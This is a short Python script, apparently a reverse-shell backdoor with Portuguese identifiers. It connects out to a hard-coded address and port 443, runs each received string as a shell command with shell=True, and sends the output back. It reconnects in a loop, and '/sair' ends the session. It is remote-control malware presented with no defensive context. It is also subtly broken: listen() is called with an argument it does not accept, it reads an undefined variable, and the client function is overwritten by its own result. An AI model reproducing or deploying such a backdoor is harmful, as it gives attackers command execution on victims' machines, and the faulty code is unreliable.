import subprocess 
import time 
import socket 
import threading 

ip = '127.0.0.1'
port = 443

def client():
  cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  cliente.connect((ip, port))
  return cliente 


def cmd(client, data):
  out = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
  output = out.stdout.read()
  client.send(output + b'\n')

def listen(): 
  while True:
    data = cliente.recv(1024).decode()
    if data == '/sair':
      exit()
    else:
      cmd(client, data)

if __name__=='__main__':
  while True:
    client = client()
    if client:
      listen(client)
    else:
      time.sleep(5)
